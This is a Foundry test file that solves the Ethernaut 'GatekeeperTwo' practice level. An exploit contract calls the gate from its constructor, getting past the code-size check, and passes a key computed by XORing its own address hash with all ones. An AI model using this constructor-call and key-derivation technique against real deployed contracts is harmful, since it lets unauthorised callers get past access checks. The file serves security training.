// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/GatekeeperTwo.sol";


contract ExploitGateKeeperTwo {
    constructor(address gateKeeperTwo) {
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(0xffffffffffffffff);
        GatekeeperTwo(gateKeeperTwo).enter(gateKey);
    }
}

contract TestGateKeeperTwo is Test {
    GatekeeperTwo gateKeeperTwo;
    address attacker = address(0x51);

    function setUp() external {
        gateKeeperTwo = new GatekeeperTwo();
    }

    function testExploit() external {
        assertEq(gateKeeperTwo.entrant(), address(0));
        vm.prank(attacker, attacker);
        new ExploitGateKeeperTwo(address(gateKeeperTwo));
        assertEq(gateKeeperTwo.entrant(), attacker);
    }

}
